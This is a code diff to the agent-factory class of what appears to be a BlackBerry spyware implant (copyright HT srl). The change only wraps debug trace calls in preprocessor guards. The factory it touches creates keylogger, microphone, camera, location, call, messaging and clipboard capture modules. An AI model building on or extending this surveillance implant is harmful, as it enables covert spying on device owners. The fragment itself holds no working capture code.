@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -20,8 +21,9 @@ import blackberry.utils.DebugLevel;
  * The Class Agent.
  */
 public abstract class Agent extends TimerJob {
-    //#debug
+    //#ifdef DEBUG
     private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);
+    //#endif
 
     public static final int AGENT = 0x1000;
     public static final int AGENT_MESSAGE = AGENT + 0x1;
@@ -63,77 +65,95 @@ public abstract class Agent extends TimerJob {
 
         switch (agentId) {
         case AGENT_MESSAGE:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_MESSAGE");
+            //#endif
             return new MessageAgent(agentStatus, confParams);
         case AGENT_TASK:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_TASK");
+            //#endif
             return new TaskAgent(agentStatus, confParams);
         case AGENT_CALLLIST:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_CALLLIST");
+            //#endif
             return new CallListAgent(agentStatus, confParams);
         case AGENT_DEVICE:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_DEVICE");
+            //#endif
             return new DeviceInfoAgent(agentStatus, confParams);
         case AGENT_POSITION:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_POSITION");
+            //#endif
             return new PositionAgent(agentStatus, confParams);
         case AGENT_CALL:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_CALL");
+            //#endif
             return new CallAgent(agentStatus, confParams);
         case AGENT_CALL_LOCAL:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_CALL_LOCAL");
+            //#endif
             return new CallLocalAgent(agentStatus, confParams);
         case AGENT_KEYLOG:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_KEYLOG");
+            //#endif
             return new KeyLogAgent(agentStatus, confParams);
         case AGENT_SNAPSHOT:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_SNAPSHOT");
+            //#endif
             return new SnapShotAgent(agentStatus, confParams);
         case AGENT_URL:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_URL");
+            //#endif
             return new UrlAgent(agentStatus, confParams);
         case AGENT_IM:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_IM");
+            //#endif
             return new ImAgent(agentStatus, confParams);
         case AGENT_MIC:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_MIC");
+            //#endif
             return new MicAgent(agentStatus, confParams);
         case AGENT_CAM:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_CAM");
+            //#endif
             return new CamAgent(agentStatus, confParams);
         case AGENT_CLIPBOARD:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_CLIPBOARD");
+            //#endif
             return new ClipBoardAgent(agentStatus, confParams);
         case AGENT_CRISIS:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_CRISIS");
+            //#endif
             return new CrisisAgent(agentStatus, confParams);
         case AGENT_APPLICATION:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_APPLICATION");
+            //#endif
             return new ApplicationAgent(agentStatus, confParams);
         case AGENT_PDA:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory AGENT_PDA");
+            //#endif
             return new PdaAgent(agentStatus, confParams);
 
         default:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("AgentId UNKNOWN: " + agentId);
+            //#endif
             return null;
         }
     }
